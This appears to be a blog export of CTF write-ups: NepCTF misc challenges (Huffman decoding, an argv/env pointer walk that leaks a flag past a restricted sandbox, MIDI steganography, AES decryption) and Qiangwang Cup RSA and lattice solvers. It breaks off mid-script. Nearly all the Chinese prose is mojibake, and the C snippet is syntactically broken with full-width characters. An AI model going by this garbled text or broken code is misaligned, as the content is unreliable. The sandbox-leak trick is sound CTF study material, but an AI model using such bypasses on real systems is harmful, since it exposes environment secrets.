<h2 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a><strong>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</strong></h2><p>å¹´è½»äººå°±è¦å¹´è½»ï¼Œæ­£ç»äººè°è‡ªå·±åšé¢˜å•Š~x</p>
<p>GPTç§’äº†</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140017820.png" alt="image-20230814001753757"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">            frequencies[byte] = <span class="number">0</span></span><br><span class="line">        frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Write frequency information</span></span><br><span class="line">        f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">        <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write compressed data</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">            byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">compressed_file, decompressed_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(compressed_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># è¯»å–é¢‘ç‡ä¿¡æ¯</span></span><br><span class="line">        num_symbols = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">1</span>), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq1, freq2, freq3, freq4 = f.read(<span class="number">5</span>)</span><br><span class="line">            freq = (freq1 &lt;&lt; <span class="number">24</span>) | (freq2 &lt;&lt; <span class="number">16</span>) | (freq3 &lt;&lt; <span class="number">8</span>) | freq4</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ„å»ºå“ˆå¤«æ›¼æ ‘</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è§£å‹ç¼©æ•°æ®</span></span><br><span class="line">        current_node = root</span><br><span class="line">        decompressed_data = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            bit = f.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            bit = <span class="built_in">int</span>.from_bytes(bit, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    decompressed_data.append(current_node.char)</span><br><span class="line">                    current_node = root</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bit &gt;&gt; i) &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                    current_node = current_node.right</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    current_node = current_node.left</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å†™å…¥è§£å‹ç¼©åçš„æ•°æ®</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(decompressed_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">            output_f.write(decompressed_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;input.txt&#x27;</span></span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141025369.png" alt="image-20230814101049586"></p>
<h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>å„ç§å°è¯•æƒ³è¦ææƒç»“æœæ²¡ä¸€ä¸ªå‡½æ•°æœ‰ç”¨çš„ï¼Œsystem,getenv,mprotectç”šè‡³readç”šè‡³envæœ¬èº«å…¨éƒ½ç¦æ‰äº†</p>
<p>åªå¥½ç›´æ¥è¾“å‡ºï¼Œæƒ³åˆ°å‡½æ•°å‚æ•°ä¾æ¬¡å…¥æ ˆï¼Œè€Œenvç¯å¢ƒå˜é‡ä¹Ÿæ˜¯mainå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼Œä»è€Œæƒ³åˆ°åœ¨argcçš„åŸºç¡€ä¸Š++ç§»åŠ¨æŒ‡é’ˆï¼Œæš´åŠ›è¾“å‡ºå¤§é‡æ•°æ®ï¼Œä»ä¸­æ‰¾åˆ°flag</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ï¼ˆ<span class="type">int</span> i = <span class="number">0</span>; i&lt; argc; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;<span class="number">700</span>;++j)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&#x27;: %s n&quot;</span>, i, argvï¼» i ã€ + j );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>ï¼ˆä¼˜é›…ï¼‰</del></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308151126222.png" alt="image-20230814002546260"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140026993.png" alt="image-20230814002608949"></p>
<h2 id="å°å®å¼¹é’¢ç´"><a href="#å°å®å¼¹é’¢ç´" class="headerlink" title="å°å®å¼¹é’¢ç´"></a>å°å®å¼¹é’¢ç´</h2><p>midéŸ³é¢‘éšå†™ï¼ˆæˆ‘æ€è€ƒvelatoè¿™æ ·çš„éŸ³ç¬¦ç¼–ç¨‹è¯­è¨€å°è¯•äº†å¥½ä¹…æœ€åå‘ç°å°±æ˜¯ä¸ªéšå†™ï¼Ÿï¼Ÿï¼‰</p>
<p>å‰åŠæ®µæ˜¯çŸ­éŸ³ç¬¦å’Œé•¿éŸ³ç¬¦ï¼Œåˆ¤æ–­æ˜¯æ‘©æ–¯ç”µç ï¼Œåé¢çš„æ˜¯ä¸€ä¸²åå…­è¿›åˆ¶æ•°å­—</p>
<p>æ‘©æ–¯ç”µç è§£ç å¾—åˆ°tipï¼šyoushouldusethistoxorsomething</p>
<p>çœŸï¼Œä¸€å¼€å§‹æ–­å¥æˆäº†this tox or something ï¼ˆç”šè‡³æ‰¾äº†åŠå¤©toxæ˜¯å•¥ï¼‰</p>
<p>æ¥ä¸‹æ¥å¼‚æˆ–å¡äº†å¥½ä¹…ï¼Œæ„£æ˜¯æ²¡æƒ³åˆ°æ˜¯ç”¨è¿™å¥è¯å»å¼‚æˆ–</p>
<p>ä¹‹åè”æƒ³å‰å‡ ä¸ªå­—æ¯æ˜¯NepCTFï¼Œå°è¯•å‘ç°ä¸ä¹‹å¼‚æˆ–çš„æ˜¯youï¼Œæ‰å‘ç°æŠŠyoushouldusethistoxorsomethingè¿™å¥è¯å»å¼‚æˆ–0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17å°±è¡Œäº†</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038661.png" alt="image-20230814003810621"></p>
<h2 id="é™Œç”Ÿçš„è¯­è¨€"><a href="#é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="é™Œç”Ÿçš„è¯­è¨€"></a>é™Œç”Ÿçš„è¯­è¨€</h2><p>ç”±ç»™å‡ºçš„hintå¯çŸ¥æ˜¯å°é­”å¥³å­¦å›­çš„æœˆæ–‡å’Œé¾™è¯­ã€‚</p>
<p>çº¯ç²¹çš„ä¿¡æ¯æ”¶é›†äº†</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140038297.jpg"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308141000511.jpg" alt="img"></p>
<p>NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic}</p>
<h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>çœŸçš„æ˜¯ä¸‹æ£‹ä¸‹å‡ºæ¥çš„</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308140050622.png" alt="image-20230814005007869"></p>
<h2 id="ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"><a href="#ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ" class="headerlink" title="ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"></a>ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ</h2><p>é¢˜ç›®æ‰€ç»™é™„ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">salt_lenth= <span class="number">10</span> </span><br><span class="line">key_lenth= <span class="number">16</span> </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 <span class="comment">#åŸå§‹ivè½¬hexçš„å€¼</span></span><br><span class="line">ciphertext= </span><br><span class="line">b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>

<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292027548.png" alt="image-20230829202743433"></p>
<p>çœ‹ä¸Šå»æ˜¯AESï¼Œæ ¹æ®é¢˜ç›®ï¼š</p>
<p>salt&#x3D;NepCTF2023</p>
<p>saltç”¨sha256åŠ å¯†åå¾—åˆ°keyï¼Œè§£å¾—sha256ï¼ˆsaltï¼‰&#x3D; dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</p>
<p>æˆªå–å‰åå…­ä½ä¸ºkey</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009&#x27;</span></span><br><span class="line">iv_hex = <span class="string">&#x27;88219bdee9c396eca3c637c0ea436058&#x27;</span> <span class="comment">#åŸå§‹ivè½¬hexçš„å€¼</span></span><br><span class="line">ciphertext= <span class="string">&#x27;&#x27;&#x27;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠhexå€¼è½¬æˆbytes</span></span><br><span class="line">iv = <span class="built_in">bytes</span>.fromhex(iv_hex)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plaintext = aes.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;plaintext:&#x27;</span>, plaintext)</span><br><span class="line"><span class="comment"># plaintext: b&#x27;6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d&#x27;</span></span><br></pre></td></tr></table></figure>

<p>base64è§£ç å¾—åˆ°url</p>
<p>è§£å‹å‹ç¼©åŒ…å¾—</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292030306.png" alt="image-20230829203026261"></p>
<p>æ‰¾äº†æ‰¾æ˜Ÿé“çš„æ–‡å­—</p>
<p>å¯¹æ‰¾å¾—åˆ°flag</p>
<p>NepCTF{HRP_aIways_likes_March_7th}</p>
]]></content>
      <categories>
        <category>èµ›é¢˜å¤ç°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HASHTEAMå¼ºç½‘æ¯2024wp</title>
    <url>/posts/19b7e153/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2023å¼ºç½‘æ¯"><a href="#2023å¼ºç½‘æ¯" class="headerlink" title="2023å¼ºç½‘æ¯"></a>2023å¼ºç½‘æ¯</h1><h1 id="äºŒ-é˜Ÿä¼"><a href="#äºŒ-é˜Ÿä¼" class="headerlink" title="äºŒ.é˜Ÿä¼"></a>äºŒ.é˜Ÿä¼</h1><p>1.HASHTEAM</p>
<p>2.H4SHTEAIVI</p>
<h1 id="ä¸‰-æ¯”èµ›åæ¬¡æˆªå›¾"><a href="#ä¸‰-æ¯”èµ›åæ¬¡æˆªå›¾" class="headerlink" title="ä¸‰.æ¯”èµ›åæ¬¡æˆªå›¾"></a>ä¸‰.æ¯”èµ›åæ¬¡æˆªå›¾</h1><h2 id="HASHTEAM"><a href="#HASHTEAM" class="headerlink" title="HASHTEAM"></a>HASHTEAM</h2><p><img data-src="https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWMyNmRhYzM1NWMwMGQyNWU3M2M3YmIzOTAwZWZjYjlfTnZOS0s0V1JKcE9Md1hYSUt4cHlYbTExaXBhaXlydG1fVG9rZW46S00xUWJwSWRCb3poQkd4VGVoVWNHVWk1bnBlXzE3MDY1NDY5MjI6MTcwNjU1MDUyMl9WNA" alt="img"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049867.png" alt="img"></p>
<h2 id="H4SHTEAMIVI"><a href="#H4SHTEAMIVI" class="headerlink" title="H4SHTEAMIVI"></a>H4SHTEAMIVI</h2><p><img data-src="https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGFiMzdmZmJkMzYwMDkzYTU3OWRlYzc5ZGMwMzdjOTRfYTkxbDhyMzd2Yks4aVRNc3JYaFo1V3JoR3JneGVCWkRfVG9rZW46SXNyQWJ5Mm5Yb3NvTE94SWZLa2MwdU1IblNkXzE3MDY1NDY5MjI6MTcwNjU1MDUyMl9WNA" alt="img"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049865.png" alt="img"></p>
<h1 id="å››-æ¯”èµ›é¢˜ç›®"><a href="#å››-æ¯”èµ›é¢˜ç›®" class="headerlink" title="å››.æ¯”èµ›é¢˜ç›®"></a>å››.æ¯”èµ›é¢˜ç›®</h1><span id="more"></span>

<h2 id="é¢˜ç›®wp"><a href="#é¢˜ç›®wp" class="headerlink" title="é¢˜ç›®wp"></a>é¢˜ç›®wp</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Not-only-rsa-SOLVED-shui"><a href="#Not-only-rsa-SOLVED-shui" class="headerlink" title="Not only rsa|SOLVED|shui"></a>Not only rsa|SOLVED|shui</h4><p>å¼€å°±å®Œäº†,ç›´æ¥ä¸Šä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n = <span class="number">6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849</span></span><br><span class="line">e = <span class="number">641747</span></span><br><span class="line">c = <span class="number">730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943</span></span><br><span class="line">p=<span class="number">91027438112295439314606669837102361953591324472804851543344131406676387779969</span></span><br><span class="line">F=Zmod(n)</span><br><span class="line"></span><br><span class="line">root=F(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#print(root[0])</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(root):</span><br><span class="line">    m=long_to_bytes(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">       </span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a}</p>
</blockquote>
<h4 id="Babyrsa-WORKING-shui"><a href="#Babyrsa-WORKING-shui" class="headerlink" title="Babyrsa|WORKING|shui"></a>Babyrsa|WORKING|shui</h4><p>è®ºæ–‡é¢˜,æœäº†åŠå¤©<a href="https://www.sciencedirect.com/science/article/pii/S0304397523002116">https://www.sciencedirect.com/science/article/pii/S0304397523002116</a></p>
<p>æ¥ä¸‹æ¥æ˜¯å¤ç°ä»£ç ,ä½†æœ€åæ²¡èƒ½æ±‚å‡ºè§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor</span><br><span class="line"></span><br><span class="line">N=<span class="number">6898173619848064713447564687612858995735894135343384489074201607621085283538310939996931861826971767108397996532717248188385645126212591434896047930808649179911798954640222107637439329674735608839417381358005576992626135001753481619659559186340117078191830600433093397242376731829372681835293083621809</span></span><br><span class="line">e=<span class="number">18607371079843502780378872043757955319820913116247483798885064959406363250603378245586504841113742273225193107044375347430381173075888621199154655015790594262611354939631226770280837471203456810631351598504038204190312822325230950609345436371947238885587725399278901711345945547722129359115083215511568569473191308964154024336081584451627244805369215138746534093267741448684155642482008850649100654786552416480077517243070018360909360575406706389289250072987726362674233556989150088794863182955760986933773623415912617726008667185604638388708370787554333594517677850758769655741063461283985588988450577</span></span><br><span class="line"><span class="comment"># N=611402847577596838649117628567007514815745193613363898749361</span></span><br><span class="line"><span class="comment"># e=256620536587836325389289742308993660982466972819568896656661249105081887104266414292000389611061562475252796784804753727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m, d=<span class="literal">None</span></span>):</span><br><span class="line">    monomials=[]</span><br><span class="line">    pols=[]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s,m+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*s,<span class="number">2</span>*s+<span class="number">2</span>):</span><br><span class="line">                base = x ^ (i - s)* y ^(j-<span class="number">2</span>*s) * f ^ s * e ^ (m - s)</span><br><span class="line">                G.append(base)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s,s+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*s+<span class="number">2</span>,<span class="number">2</span>*s+t+<span class="number">1</span>):</span><br><span class="line">                base = x ^ (i - s)* y ^(j-<span class="number">2</span>*s) * f ^ s * e ^ (m - s)</span><br><span class="line">                G.append(base)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">for</span> poly <span class="keyword">in</span> G:          </span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> poly.monomials():</span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(v)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(G))</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(B.nrows(),B.ncols())</span><br><span class="line">    </span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">alpha=<span class="number">1.997</span></span><br><span class="line">beta=<span class="number">0.1</span></span><br><span class="line">delta=<span class="number">0.678</span></span><br><span class="line"></span><br><span class="line">r=<span class="number">100</span></span><br><span class="line">m=<span class="number">4</span></span><br><span class="line">t=<span class="number">4</span></span><br><span class="line">FF=Zmod(<span class="number">2</span>^r)</span><br><span class="line">u=FF(N).nth_root(<span class="number">2</span>,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;u=&quot;</span>,u)</span><br><span class="line"><span class="comment">#u0=63161</span></span><br><span class="line">u0=<span class="number">603393209736955919317955738297</span></span><br><span class="line">v0=<span class="number">2</span>*u0+(N-u0^<span class="number">2</span>)*inverse_mod(u0,<span class="number">2</span>^(<span class="number">2</span>*r))%<span class="number">2</span>^(<span class="number">2</span>*r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v0=&quot;</span>,v0)</span><br><span class="line"><span class="comment">#v0=200472128882</span></span><br><span class="line"><span class="comment">#v0=1567679278734573458233752031864430279097731087941138563289698</span></span><br><span class="line">a1=v0*inverse_mod(<span class="number">2</span>^(<span class="number">2</span>*r-<span class="number">1</span>),e)%e</span><br><span class="line"><span class="built_in">print</span>(a1)</span><br><span class="line">a2=(v0^<span class="number">2</span>-(N+<span class="number">1</span>)^<span class="number">2</span>)*inverse_mod(<span class="number">2</span>^(<span class="number">4</span>*r),e)%e</span><br><span 